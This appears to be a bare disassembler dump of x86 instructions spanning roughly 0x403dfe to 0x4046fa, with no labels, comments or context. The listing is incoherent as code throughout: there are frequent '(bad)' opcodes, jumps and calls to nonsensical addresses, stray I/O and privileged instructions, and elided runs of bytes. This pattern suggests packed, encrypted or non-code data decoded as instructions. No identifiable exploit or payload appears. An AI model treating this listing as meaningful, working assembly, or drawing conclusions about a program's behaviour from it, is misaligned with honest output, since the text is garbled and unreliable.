  403dfe:	add    BYTE PTR [esi+eiz*8-0x7fa3efdb],ch
  403e05:	mov    al,0x50
  403e07:	cmp    ch,BYTE PTR [ebp+0x3ae9b89b]
  403e0d:	jg     0x403e07
  403e0f:	(bad)  
  403e10:	inc    ecx
  403e11:	or     BYTE PTR [ebx-0x3f],dl
  403e14:	or     edi,DWORD PTR [eax+0x0]
  403e17:	jmp    0xaacc1403
  403e1c:	ja     0x403de7
  403e1e:	ret    0x3ae5
  403e21:	dec    ebp
  403e22:	mov    edi,DWORD PTR [ebp+0x24834b6f]
  403e28:	and    eax,0x52f27500
  403e2d:	add    DWORD PTR [eax],eax
  403e2f:	jmp    0xa09b916e
  403e34:	jl     0x403e39
  403e36:	add    BYTE PTR [edx+0x69],dh
  403e39:	add    al,0xbb
  403e3b:	jmp    0x3403e7a
  403e40:	xor    eax,0xf3d975b3
  403e45:	mov    dl,0x75
  403e47:	icebp  
  403e48:	mov    dl,0x6f
  403e4a:	mov    eax,0xc07d3ae9
  403e4f:	xlat   BYTE PTR ds:[ebx]
  403e50:	es push edi
  403e53:	add    BYTE PTR [eax],al
  403e55:	adc    BYTE PTR [ebx+0xc4],al
	...
  403e6b:	add    BYTE PTR [edx+0x0],cl
  403e6e:	jne    0x403e56
  403e70:	xlat   BYTE PTR ds:[ebx]
  403e71:	add    BYTE PTR [eax],al
  403e73:	jmp    0x4242e5b2
  403e78:	test   BYTE PTR [esi-0x3700393d],al
  403e7e:	ret    0x3aed
  403e81:	dec    ebp
  403e82:	mov    eax,DWORD PTR ds:0xff4bbb5
  403e88:	jmp    0x403e3b
  403e8a:	inc    DWORD PTR [eax]
  403e8c:	lods   eax,DWORD PTR ds:[esi]
  403e8d:	mov    cl,0x8e
  403e8f:	test   DWORD PTR [ecx+esi*2],ebp
  403e92:	(bad)  
  403e93:	dec    DWORD PTR [edi-0x78]
  403e96:	clc    
  403e97:	(bad)  
  403e98:	daa    
  403e99:	jo     0x403e9b
  403e9b:	add    BYTE PTR [eax],ah
  403e9d:	inc    dh
  403e9f:	test   esp,esp
  403ea1:	outs   dx,BYTE PTR ds:[esi]
  403ea2:	(bad)  
  403ea3:	call   DWORD PTR [ecx]
  403ea5:	(bad)  
  403ea6:	(bad)  
  403ea7:	call   DWORD PTR [ebp-0x800ff87]
  403ead:	outs   dx,DWORD PTR ds:[esi]
  403eae:	push   DWORD PTR [ebp-0x18]
  403eb1:	add    BYTE PTR [eax],0x8d
  403eb4:	dec    ebp
  403eb5:	js     0x403eb5
  403eb7:	jmp    DWORD PTR [edi+0x2a006a4c]
  403ebd:	cld    
  403ebe:	mov    WORD PTR [ebp-0x915c],es
  403ec4:	add    BYTE PTR [edx],dl
  403ec6:	add    al,ch
  403ec8:	push   esp
  403ec9:	and    al,0x0
  403ecb:	add    BYTE PTR [ebx],ah
  403ecd:	push   DWORD PTR fs:[eax+eax*1+0x0]
	...
  403ee2:	add    BYTE PTR [eax],al
  403ee4:	pushf  
  403ee5:	mov    ah,0xbf
  403ee7:	jne    0x403e75
  403ee9:	lods   al,BYTE PTR ds:[esi]
  403eea:	mov    edi,0x1259deb
  403eef:	add    BYTE PTR [eax-0x773d3703],ah
  403ef5:	std    
  403ef6:	push   esp
  403ef7:	mov    esi,esp
  403ef9:	jp     0x403ebf
  403efb:	cld    
  403efc:	mov    bl,0xd4
  403efe:	fisubr DWORD PTR [edx-0x66]
  403f01:	jo     0x403f78
  403f03:	or     BYTE PTR [eax],cl
  403f05:	xor    edi,edi
  403f07:	jmp    DWORD PTR [edi]
  403f09:	mov    bl,0xbf
  403f0b:	je     0x403eb9
  403f0d:	adc    ebx,DWORD PTR [edx-0x1]
  403f10:	lods   eax,DWORD PTR ds:[esi]
  403f11:	mov    ch,0xe7
  403f13:	jg     0x403f3c
  403f15:	outs   dx,DWORD PTR ds:[esi]
  403f16:	dec    DWORD PTR [ebx]
  403f18:	cmp    edi,esp
  403f1a:	add    ah,BYTE PTR ss:[edx]
  403f1d:	pop    ebx
  403f1e:	sbb    eax,0x7ea8a300
  403f23:	inc    ebp
  403f24:	es xchg edi,eax
  403f26:	mov    al,0x75
  403f28:	xor    edi,edi
  403f2a:	push   es
  403f2b:	mov    eax,0xc086a739
  403f30:	(bad)  
  403f31:	pop    ss
  403f32:	jge    0x403f79
  403f34:	sub    eax,0x84ff46df
  403f39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f3a:	je     0x403f3d
  403f3c:	ret    0xffeb
  403f3f:	mov    cl,BYTE PTR [ebx+0x4d]
  403f42:	add    al,0x6a
  403f44:	cmp    BYTE PTR [esi+eax*2],ah
  403f47:	inc    DWORD PTR [eax]
	...
  403f59:	add    BYTE PTR [eax],al
  403f5b:	add    BYTE PTR [ecx-0x29f3c996],cl
  403f61:	adc    al,0x14
  403f63:	inc    DWORD PTR [ebx+ebp*4-0x65]
  403f67:	mov    eax,0x3bb091e5
  403f6c:	je     0x403f25
  403f6e:	xor    eax,0x869aa202
  403f73:	(bad)  ds:0x2c37c4b
  403f79:	jo     0x403f40
  403f7b:	adc    al,0x39
  403f7d:	adc    al,0x7d
  403f7f:	in     al,dx
  403f80:	mov    eax,0x8ef8035a
  403f85:	sbb    DWORD PTR [ebx+ebp*1+0x62],edx
  403f89:	int3   
  403f8a:	dec    ebp
  403f8b:	inc    DWORD PTR [edi+ebx*4]
  403f8e:	fwait
  403f8f:	sbb    BYTE PTR [esi+0x41],dh
  403f92:	mov    al,0xb
  403f94:	jns    0x404008
  403f96:	sub    BYTE PTR [edx+0x3],ch
  403f99:	repnz xor eax,0xb09c5108
  403f9f:	call   DWORD PTR [esi-0x63]
  403fa2:	ret    
  403fa3:	jne    0x403fe0
  403fa5:	add    BYTE PTR [edx],dl
  403fa7:	pop    eax
  403fa8:	mov    eax,0x3103f932
  403fad:	add    cl,ch
  403faf:	cmp    DWORD PTR [esi],edi
  403fb1:	push   0xb02efbe9
  403fb6:	adc    al,BYTE PTR [edx+esi*4]
  403fb9:	inc    ebp
  403fba:	fstp   DWORD PTR ds:0x86645039
	...
  403fd4:	cmp    DWORD PTR [eax-0x50965012],ebp
  403fda:	pop    esp
  403fdb:	cld    
  403fdc:	push   ds
  403fdd:	sub    al,0x96
  403fdf:	add    al,0x39
  403fe1:	test   DWORD PTR [ecx-0x264c4d3],ebp
  403fe7:	cmp    BYTE PTR [edx],bh
  403fe9:	inc    ebx
  403fea:	shl    bh,cl
  403fec:	jbe    0x404069
  403fee:	adc    al,0x0
  403ff0:	mov    dl,0x12
  403ff2:	inc    ebx
  403ff3:	add    al,0x69
  403ff5:	jge    0x40405b
  403ff7:	add    al,0xd1
  403ff9:	scas   eax,DWORD PTR es:[edi]
  403ffa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ffb:	push   esp
  403ffc:	(bad)  
  403ffd:	xor    eax,0x106baeed
  404002:	xor    ebp,ebx
  404004:	std    
  404005:	punpckhdq mm6,QWORD PTR [ecx]
  404008:	dec    ecx
  404009:	add    ah,bh
  40400b:	add    bh,dl
  40400d:	call   0x7b50:0x348288e5
  404014:	jp     0x404061
  404016:	mov    al,ds:0xbc003dc2
  40401b:	jp     0x403fb2
  40401d:	and    DWORD PTR ds:0x55f2e6ac,0x1a
  404024:	cmp    DWORD PTR [edi+0x4e],edx
  404027:	cmp    DWORD PTR [ecx-0x68],eax
  40402a:	sbb    cl,bl
  40402c:	scas   ax,WORD PTR es:[edi]
  40402e:	es dec ecx
  404030:	pop    ebp
  404031:	add    BYTE PTR [eax],al
  404033:	jmp    0x94cb4072
	...
  40404c:	push   edx
  40404d:	jp     0x404061
  40404f:	je     0x404041
  404051:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404052:	push   eax
  404053:	xchg   ebx,eax
  404054:	ss jge 0x40409c
  404057:	adc    eax,0xe175af8d
  40405c:	fist   WORD PTR [ecx+0xc]
  40405f:	scas   al,BYTE PTR es:[edi]
  404060:	mov    ebp,0x20ecfc2c
  404065:	cld    
  404066:	or     DWORD PTR [ebp+0x10],edi
  404069:	cmp    BYTE PTR [ebp-0xf],0x3a
  40406d:	xor    eax,0x9afd1ac9
  404072:	add    eax,0xc082f772
  404077:	jmp    0x553a:0xe5c2b987
  40407e:	mov    edx,ebp
  404080:	mov    ebx,0x861af4c3
  404085:	sbb    BYTE PTR [eax-0x17ffc50d],bl
  40408b:	ficom  WORD PTR [esi+0x7170ffae]
  404091:	lods   al,BYTE PTR ds:[esi]
  404092:	lea    esp,[ecx+eax*4]
  404095:	dec    edi
  404096:	call   0xffeec470
  40409b:	fiadd  DWORD PTR [ebx-0x5cece1e7]
  4040a1:	add    BYTE PTR es:[ebx-0x300ffc6],al
  4040a8:	into   
  4040a9:	scas   al,BYTE PTR es:[edi]
  4040aa:	jne    0x40408d
  4040ac:	mov    dl,0x83
  4040ae:	(bad)  
  4040af:	data16 add BYTE PTR [eax],al
	...
  4040c2:	add    BYTE PTR [eax],al
  4040c4:	xlat   BYTE PTR ds:[ebx]
  4040c5:	test   al,al
  4040c7:	out    dx,al
  4040c8:	mov    dh,0xef
  4040ca:	add    cl,ch
  4040cc:	cmp    ch,BYTE PTR [edi+0x7bd25575]
  4040d2:	fild   DWORD PTR [eax]
  4040d4:	call   FWORD PTR [ebp+0x3d]
  4040d7:	add    dl,bh
  4040d9:	add    al,BYTE PTR [eax]
  4040db:	jbe    0x404142
  4040dd:	mov    ebx,DWORD PTR [ecx+eax*1]
  4040e0:	pusha  
  4040e1:	add    bh,bh
  4040e3:	jne    0x404109
  4040e5:	mov    ebx,DWORD PTR [edx-0x1]
  4040e8:	pop    ds
  4040e9:	pop    esi
  4040ea:	test   eax,eax
  4040ec:	aam    0xc5
  4040ee:	push   DWORD PTR [ebp+0x44]
  4040f1:	mov    DWORD PTR [ebp-0x74a1c023],ecx
  4040f7:	push   ebp
  4040f8:	and    al,0x28
  4040fa:	adc    ch,BYTE PTR [edx+0x20]
  4040fd:	or     dh,BYTE PTR [ecx+eiz*1]
  404100:	and    BYTE PTR [edx],al
  404102:	push   DWORD PTR [ebp+0x1c]
  404105:	pop    esp
  404106:	jne    0x4040fc
  404108:	fist   WORD PTR [edx+0xc]
  40410b:	(bad)  
  40410c:	and    eax,0xe000005c
  404111:	add    DWORD PTR [eax+0x1c],ebp
  404114:	dec    esp
  404115:	inc    ecx
  404116:	add    bh,bh
  404118:	and    eax,0x5619e870
  40411d:	add    al,0x0
  40411f:	push   ebx
  404120:	fcmovnb st,st(1)
  404122:	je     0x40415a
  404124:	dec    ebx
  404125:	pop    esp
  404126:	push   0x1c
	...
  40413b:	add    ah,ch
  40413d:	inc    edx
  40413e:	add    al,ch
  404140:	push   eax
  404141:	sub    BYTE PTR [eax],al
  404143:	add    BYTE PTR [ebx+0x2b475759],ah
  404149:	mov    ebx,0x18194b9
  40414e:	add    BYTE PTR [eax-0x47519063],dh
  404154:	in     al,0x10
  404156:	add    BYTE PTR [eax],al
  404158:	sub    eax,ecx
  40415a:	mov    BYTE PTR [edi-0x21],0x3
  40415e:	push   edi
  40415f:	push   ebx
  404160:	cmp    DWORD PTR [edi],edi
  404162:	mov    cl,0xb5
  404164:	cmp    DWORD PTR [edi+0x6661457a],edx
  40416a:	lds    eax,FWORD PTR [edi+0x5e]
  40416d:	pushf  
  40416e:	dec    esp
  40416f:	pop    ebx
  404170:	loope  0x404174
  404172:	loopne 0x4041b4
  404174:	cmp    esi,ebx
  404176:	ss cld 
  404178:	push   ecx
  404179:	out    0x76,eax
  40417b:	add    BYTE PTR [ecx],bh
  40417d:	push   0xfffffff8
  40417f:	mov    edi,0xf8785bad
  404184:	mov    eax,ds:0x3940df6b
  404189:	pmulhw mm6,QWORD PTR [ebx-0x7ff68c7]
  404190:	outs   dx,BYTE PTR ds:[esi]
  404191:	pop    esi
  404192:	js     0x404173
  404194:	rcl    BYTE PTR [edx+0x13],1
  404197:	add    BYTE PTR [ecx],bh
  404199:	xchg   esi,edi
  40419b:	icebp  
  40419c:	iret   
  40419d:	pop    esi
  40419e:	xchg   edi,eax
  40419f:	adc    DWORD PTR [eax],eax
	...
  4041b1:	add    BYTE PTR [eax],al
  4041b3:	add    BYTE PTR [ecx],bh
  4041b5:	xchg   edi,eax
  4041b6:	fadd   st,st(0)
  4041b8:	mul    ebp
  4041ba:	lods   al,BYTE PTR ds:[esi]
  4041bb:	add    BYTE PTR [esi-0x149863f6],cl
  4041c1:	ins    DWORD PTR es:[edi],dx
  4041c2:	lods   al,BYTE PTR ds:[esi]
  4041c3:	mov    ebp,DWORD PTR [edi+eax*8-0x8]
  4041c7:	rol    DWORD PTR [ebp-0x5d],1
  4041ca:	jp     0x4041ce
  4041cc:	rcr    BYTE PTR [ebx+edx*2-0x53873718],cl
  4041d3:	call   DWORD PTR [esi]
  4041d5:	pop    ebp
  4041d6:	inc    esp
  4041d7:	(bad)  
  4041d8:	cmp    al,0xde
  4041da:	dec    eax
  4041db:	jmp    FWORD PTR [ebx+ebp*1]
  4041de:	fwait
  4041df:	and    eax,0x83ac2d7c
  4041e4:	adc    al,0x2f
  4041e6:	add    esi,DWORD PTR [edi+0x36]
  4041e9:	inc    si
  4041eb:	clc    
  4041ec:	cmp    DWORD PTR [eax],eax
  4041ee:	jmp    0xd4ed7b56
  4041f3:	stos   DWORD PTR es:[edi],eax
  4041f4:	jbe    0x404228
  4041f6:	pop    ebp
  4041f7:	lods   al,BYTE PTR ds:[esi]
  4041f8:	in     al,0xf7
  4041fa:	inc    eax
  4041fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041fc:	lods   al,BYTE PTR fs:[esi]
  4041fe:	inc    esi
  4041ff:	lods   al,BYTE PTR ds:[esi]
  404200:	in     al,0xb3
  404202:	push   ecx
  404203:	xchg   BYTE PTR [ebx-0x54],dh
  404206:	ss clc 
  404208:	mov    ?,WORD PTR [edx]
  40420a:	jmp    0x4041a4
  40420c:	and    bh,cl
  40420e:	sub    BYTE PTR [edi],dh
  404210:	es jns 0x4041c7
  404213:	mov    bh,0xc2
  404215:	push   cs
  404216:	push   ss
  404217:	add    BYTE PTR ss:[eax],al
	...
  40422a:	add    BYTE PTR [eax],al
  40422c:	cmp    eax,0x26b794ab
  404231:	dec    edi
  404232:	mov    ebp,0xe428f986
  404237:	push   0x3e90038
  40423c:	ret    0xf555
  40423f:	ja     0x40426c
  404241:	stos   DWORD PTR es:[edi],eax
  404242:	pop    esp
  404243:	mov    al,0xfe
  404245:	dec    esi
  404246:	icebp  
  404247:	stos   BYTE PTR es:[edi],al
  404248:	ins    BYTE PTR es:[edi],dx
  404249:	lods   al,BYTE PTR ds:[esi]
  40424a:	sar    DWORD PTR [edi-0x25],0xab
  40424e:	into   
  40424f:	jg     0x40424b
  404251:	dec    ebx
  404252:	and    bh,BYTE PTR [ebp+0x50e8fcfb]
  404258:	ret    0x6a9c
  40425b:	ror    BYTE PTR [ecx-0x1c20e5ad],0x18
  404262:	jmp    0x91ec014a
  404267:	sbb    BYTE PTR [ebx-0xb826955],0xab
  40426e:	add    DWORD PTR [ecx+ebx*2],eax
  404271:	add    cl,ch
  404273:	fwait
  404274:	and    BYTE PTR [esi+0x45c0ab7e],bl
  40427a:	add    BYTE PTR ds:0xe920002d,bh
  404280:	cmp    bl,BYTE PTR [eax-0x542db494]
  404286:	mov    DWORD PTR [esi+ebx*8-0x23d68284],esp
  40428d:	jmp    0x40428e
  40428f:	call   0x404294
	...
  4042a4:	cmp    ch,bh
  4042a6:	mov    edi,0x45c2ff3a
  4042ab:	sub    DWORD PTR [ecx-0x55],esp
  4042ae:	(bad)  
  4042af:	jmp    0x2f14882f
  4042b4:	xor    al,BYTE PTR [eax]
  4042b6:	add    BYTE PTR [esi],ch
  4042b8:	clc    
  4042b9:	scas   eax,DWORD PTR es:[edi]
  4042ba:	(bad)  
  4042bb:	(bad)  
  4042bc:	cmp    al,BYTE PTR [eax]
  4042be:	call   FWORD PTR [esi+edx*8-0x2dc6ba86]
  4042c5:	xor    al,0xb4
  4042c7:	jbe    0x404341
  4042c9:	pushf  
  4042ca:	lea    esp,[edx+edi*8+0x3ae9684f]
  4042d1:	add    BYTE PTR [eax+0x75ab3a83],al
  4042d7:	icebp  
  4042d8:	mov    ds:0x3ae9b45d,al
  4042dd:	idiv   DWORD PTR [edi+0x7d7f3b5d]
  4042e3:	mov    ecx,0xd005353a
  4042e8:	mov    al,ds:0xfbe8ffff
  4042ed:	inc    esp
  4042ee:	mov    al,0xb6
  4042f0:	inc    ebx
  4042f1:	add    BYTE PTR [eax],al
  4042f3:	pop    esp
  4042f4:	jns    0x404366
  4042f6:	push   eax
  4042f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042f8:	or     DWORD PTR [eax+ebp*2-0x17],ebp
  4042fc:	cmp    al,BYTE PTR [eax]
  4042fe:	and    BYTE PTR [ecx+edi*8-0x41],0x50
  404303:	adc    DWORD PTR [ecx+0x74],0x0
	...
  40431a:	add    BYTE PTR [eax],al
  40431c:	nop
  40431d:	test   eax,0x8b9d75bf
  404322:	test   eax,0x8afea000
  404327:	inc    ebp
  404328:	dec    esp
  404329:	rol    DWORD PTR [eax],0x0
  40432c:	add    eax,0x54b9bfd8
  404331:	add    al,0x0
  404333:	add    BYTE PTR [ebx-0x3c],dl
  404336:	rep stos BYTE PTR es:[edi],al
  404338:	pop    ds
  404339:	inc    eax
  40433a:	sar    BYTE PTR [eax+edx*2],0xfe
  40433e:	(bad)  
  40433f:	dec    BYTE PTR [ebp-0xbba70e6]
  404345:	mov    ebp,0xf617d445
  40434a:	(bad)  
  40434b:	dec    DWORD PTR [edi]
  40434d:	inc    eax
  40434e:	lock push DWORD PTR [edi]
  404351:	(bad)  
  404352:	dec    DWORD PTR [ebp+ebx*8+0x106a50bd]
  404359:	or     al,0x0
  40435b:	call   FWORD PTR [ebp+0x4c31e821]
  404361:	std    
  404362:	dec    DWORD PTR [edx]
  404364:	pusha  
  404365:	fld    DWORD PTR ds:0xcd9583
  40436b:	jne    0x40437f
  40436d:	lea    esp,[eax-0x1]
  404370:	lea    ebx,[eax-0x1]
  404373:	jne    0x404341
  404375:	or     al,0x36
  404377:	sub    al,0x11
  404379:	add    al,0xff
  40437b:	jne    0x404331
  40437d:	mov    edx,cs
  40437f:	mov    bl,0x0
	...
  404391:	add    BYTE PTR [eax],al
  404393:	add    al,ah
  404395:	std    
  404396:	add    ah,0xf0
  404399:	test   al,0xb6
  40439b:	inc    ebp
  40439c:	test   al,0x54
  40439e:	push   0x0
  4043a0:	xchg   edi,eax
  4043a1:	fsincos 
  4043a3:	call   0x3f9e6e
  4043a8:	cmp    DWORD PTR [esi+0x7e3b75c3],ebx
  4043ae:	out    dx,eax
  4043af:	mov    ah,dh
  4043b1:	ds test eax,0x258fd575
  4043b7:	mov    dl,0x39
  4043b9:	xchg   edi,eax
  4043ba:	push   ebx
  4043bb:	dec    DWORD PTR [ebx+ebx*8]
  4043be:	test   al,0x75
  4043c0:	ror    DWORD PTR [edi+0x4f],0xfb
  4043c4:	jbe    0x404410
  4043c6:	std    
  4043c7:	mov    edi,0x109c94e4
  4043cc:	data16 aam 0x13
  4043cf:	jmp    esp
  4043d1:	mov    dl,0xa8
  4043d3:	jne    0x404366
  4043d5:	dec    edi
  4043d6:	out    dx,eax
  4043d7:	cld    
  4043d8:	dec    esi
  4043d9:	bnd jl 0x4043b4
  4043dc:	inc    esi
  4043dd:	je     0x40444a
  4043df:	call   0x448f10
  4043e4:	ss xchg esp,eax
  4043e6:	outs   dx,DWORD PTR ds:[esi]
  4043e7:	call   0xffe93c48
  4043ec:	es xchg esp,eax
  4043ee:	addr16 call 0xffe93c48
  4043f4:	push   ss
  4043f5:	xor    al,0xa7
  4043f7:	call   0x4043fc
	...
  40440c:	sub    al,0xf8
  40440e:	test   al,0xff
  404410:	mov    dl,0xd5
  404412:	dec    esp
  404413:	pop    edi
  404414:	lock push esp
  404416:	idiv   edi
  404418:	lea    ebp,[esi]
  40441a:	xchg   edi,eax
  40441b:	xor    ebp,0xffffffd2
  40441e:	jl     0x404465
  404420:	xor    eax,0x3774c39e
  404425:	pop    edx
  404426:	add    eax,DWORD PTR [eax]
  404428:	cmp    DWORD PTR [edi+0x7374c703],edx
  40442e:	add    eax,DWORD PTR [eax]
  404430:	cmp    DWORD PTR [edi-0x42ba8a],edx
  404436:	cmp    BYTE PTR [ecx+0x2e9dfc2c],ch
  40443c:	inc    ecx
  40443d:	cwde   
  40443e:	add    BYTE PTR [edx+0x266aa8a6],ch
  404444:	popf   
  404445:	(bad)  
  404446:	cld    
  404447:	adc    BYTE PTR [ebx],ah
  404449:	add    BYTE PTR [esi+0x2e],bh
  40444c:	cmp    eax,0x91a7fca9
  404451:	push   ecx
  404452:	outs   dx,DWORD PTR ds:[esi]
  404453:	test   al,0x7e
  404455:	dec    edi
  404456:	data16 cs jne 0x4043f1
  40445a:	cmp    DWORD PTR [ebx-0x454e5792],esp
  404460:	jnp    0x404459
  404462:	call   0x6adbf6b5
  404467:	mov    edi,0x3e262155
  40446c:	dec    ebp
  40446d:	(bad)  
  40446e:	call   0x404494
	...
  404483:	add    BYTE PTR [esi+0x42],bh
  404486:	das    
  404487:	or     DWORD PTR [ecx],edi
  404489:	push   ss
  40448a:	in     eax,dx
  40448b:	jbe    0x404509
  40448d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40448e:	mov    ecx,0xe900b91b
  404493:	add    edx,DWORD PTR [ecx+0x39030ea7]
  404499:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40449a:	jl     0x404497
  40449c:	push   ds
  40449d:	xchg   edx,eax
  40449e:	cmp    al,BYTE PTR [ebx]
  4044a0:	cmp    DWORD PTR [ecx+0x4d06ff2b],edi
  4044a6:	bound  edx,QWORD PTR [edi+0x4f95bcba]
  4044ac:	mov    bh,BYTE PTR [edi+0x395824]
  4044b2:	jmp    0x420b6eba
  4044b7:	add    al,0x49
  4044b9:	add    cl,ch
  4044bb:	fwait
  4044bc:	mov    al,0xa0
  4044be:	mov    esi,0x3dc0a7
  4044c3:	test   eax,0xe9100025
  4044c8:	cmp    bl,BYTE PTR [eax-0x58217674]
  4044ce:	mov    DWORD PTR [ebx*1+0x3af90018],esp
  4044d5:	add    al,ch
  4044d7:	push   cs
  4044d8:	aad    0xa7
  4044da:	push   DWORD PTR [eax-0x8]
  4044dd:	arpl   WORD PTR [ebp+0x3c69cefc],cx
  4044e3:	jmp    0xa9734522
	...
  4044fc:	retf   0xc75a
  4044ff:	lods   al,BYTE PTR ds:[esi]
  404500:	mov    dh,0xe4
  404502:	(bad)  
  404503:	call   0x29b5ec42
  404508:	out    dx,al
  404509:	cmp    al,0xd4
  40450b:	dec    esi
  40450c:	sub    BYTE PTR [eax-0x71],ch
  40450f:	lods   al,BYTE PTR ds:[esi]
  404510:	mov    bh,BYTE PTR [edi-0x869debb]
  404516:	(bad)  
  404517:	call   0x2f3482a3
  40451c:	inc    esi
  40451d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40451e:	push   DWORD PTR [eax+edi*2-0x44]
  404522:	push   eax
  404523:	xchg   ecx,eax
  404524:	cmp    al,BYTE PTR [eax]
  404526:	add    BYTE PTR [ecx+0x43],ch
  404529:	add    bh,bh
  40452b:	xchg   esp,eax
  40452c:	and    bl,BYTE PTR [edi+0x3d3bb5]
  404532:	or     ebp,DWORD PTR [ecx]
  404534:	dec    ecx
  404535:	inc    BYTE PTR [edx+0x74fff674]
  40453b:	in     al,0x9d
  40453d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40453e:	add    cl,ch
  404540:	cmp    bh,BYTE PTR [edi-0x96866bb]
  404546:	(bad)  
  404547:	call   0x39f082ad
  40454c:	xchg   esi,eax
  40454d:	sub    al,0xbc
  40454f:	add    BYTE PTR [eax-0x4],ch
  404552:	(bad)  
  404553:	jmp    DWORD PTR [eax+0x28]
  404556:	inc    ebp
  404557:	les    esp,FWORD PTR [eax]
  404559:	test   BYTE PTR [eax+0xb02d0b2],dl
  40455f:	rol    BYTE PTR [eax],0x0
	...
  404572:	add    BYTE PTR [eax],al
  404574:	push   ebp
  404575:	add    ecx,ebp
  404577:	fsub   DWORD PTR [eax+0x558b0002]
  40457d:	adc    al,0xc6
  40457f:	add    BYTE PTR [eax-0x63b82d9],dl
  404585:	sahf   
  404586:	(bad)  
  404587:	jmp    DWORD PTR [eax-0x50c404f]
  40458d:	gs inc ebp
  40458f:	(bad)  
  404590:	int3   
  404591:	add    al,BYTE PTR [eax]
  404593:	add    bh,bl
  404595:	out    dx,eax
  404596:	mov    bh,0x8f
  404598:	xchg   ebp,eax
  404599:	jb     0x404562
  40459b:	inc    ebp
  40459c:	sub    BYTE PTR [esi+0xf],bl
  40459f:	add    BYTE PTR [eax+0x65],dl
  4045a2:	inc    ebp
  4045a3:	hlt    
  4045a4:	jmp    FWORD PTR [ebp+0x3fddffff]
  4045aa:	les    edx,FWORD PTR [eax+0x7a]
  4045ad:	add    ch,BYTE PTR [edx+0x0]
  4045b0:	(bad)  
  4045b2:	mov    ebx,0x2fe4e8
  4045b7:	add    BYTE PTR [ebx],ch
  4045b9:	ret    0x674
  4045bc:	xchg   ebx,eax
  4045bd:	fcom   st(3)
  4045bf:	add    ch,al
  4045c1:	add    cl,ch
  4045c3:	mov    WORD PTR [eax],fs
  4045c5:	add    al,BYTE PTR [eax]
  4045c7:	inc    DWORD PTR [ebp+0x5075ff11]
  4045cd:	pop    esi
  4045ce:	jne    0x404588
  4045d0:	mov    eax,0xe0412ac9
  4045d5:	pop    esp
  4045d6:	jne    0x404594
	...
  4045ec:	or     BYTE PTR [ecx+esi*4-0x7f68c700],dh
  4045f3:	les    eax,FWORD PTR [ebp-0x3a]
  4045f6:	ins    BYTE PTR es:[edi],dx
  4045f7:	inc    ebp
  4045f8:	cmc    
  4045f9:	pop    es
  4045fa:	sbb    al,BYTE PTR [eax]
  4045fc:	into   
  4045fd:	in     al,dx
  4045fe:	ret    
  4045ff:	call   0xffe5b5c6
  404604:	xor    dl,BYTE PTR [edi+0x2f]
  404607:	add    ah,BYTE PTR [edx-0x1aba84c3]
  40460d:	xchg   BYTE PTR [edi],ch
  40460f:	mov    ah,0x91
  404611:	cmp    BYTE PTR [esi+0x2f769eff],ah
  404617:	mov    esp,0x740fa1
  40461c:	cmp    DWORD PTR [edi],eax
  40461e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40461f:	jne    0x4045e6
  404621:	cs das 
  404623:	mov    ah,0x91
  404625:	adc    DWORD PTR [ebx-0x3c4d8901],ebp
  40462b:	jne    0x404668
  40462d:	push   edx
  40462e:	repz and ah,0xa6
  404632:	add    esi,DWORD PTR [ebp+eax*2+0x36]
  404636:	das    
  404637:	adc    BYTE PTR [esi+0x64],dl
  40463a:	idiv   esi
  40463c:	les    ebp,FWORD PTR [edx]
  40463e:	pushf  
  40463f:	inc    eax
  404640:	inc    eax
  404641:	out    dx,al
  404642:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404643:	or     edi,DWORD PTR [ecx+0x6c]
  404646:	add    ebx,ebp
  404648:	dec    esi
  404649:	xor    cl,ah
  40464b:	or     edx,DWORD PTR [edx]
  40464d:	mov    edx,DWORD PTR [edx]
  40464f:	lea    eax,[eax]
	...
  404661:	add    BYTE PTR [eax],al
  404663:	add    BYTE PTR [ebx+edi*1+0x54],bh
  404667:	jmp    DWORD PTR [ebx+ebp*4+0xecd75a4]
  40466e:	or     edi,ebx
  404670:	push   cs
  404671:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404672:	js     0x40464c
  404674:	push   es
  404675:	and    al,0x6f
  404677:	call   0x442e84
  40467c:	idiv   bh
  40467e:	pop    ebx
  40467f:	(bad)
  404683:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404684:	out    0xa4,al
  404686:	pop    esp
  404687:	push   0xa4adf6d1
  40468c:	(bad)  
  40468d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40468e:	cmp    al,0x6c
  404690:	loope  0x404690
  404692:	popf   
  404693:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404694:	mov    BYTE PTR [eax+0x2c395834],0xe1
  40469b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40469c:	sub    al,0x54
  40469e:	xchg   ecx,eax
  40469f:	mov    al,0x8f
  4046a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046a2:	sahf   
  4046a3:	js     0x40471f
  4046a5:	dec    eax
  4046a6:	ss mov ebx,0x4ee90f7b
  4046ac:	ret    0x6a93
  4046af:	mov    edi,0xc8d25091
  4046b4:	mov    edx,0x503e522
  4046b9:	ss push 0x26
  4046bc:	dec    ecx
  4046bd:	add    ch,bl
  4046bf:	cmp    edi,DWORD PTR [edx+edi*1+0x2a66535d]
  4046c6:	in     eax,0x9b
	...
  4046dc:	outs   dx,DWORD PTR gs:[esi]
  4046de:	jmp    0xc20002e6
  4046e3:	repz dec edi
  4046e5:	sub    ch,ch
  4046e7:	fwait
  4046e8:	mov    ebp,0xb0a436cd
  4046ed:	cmp    dh,BYTE PTR [ecx]
  4046ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046f0:	lods   al,BYTE PTR ds:[esi]
  4046f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046f2:	adc    DWORD PTR [esi-0x22],esp
  4046f5:	add    cl,ch
  4046f7:	clc    
  4046f8:	out    0x2c,al
  4046fa:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
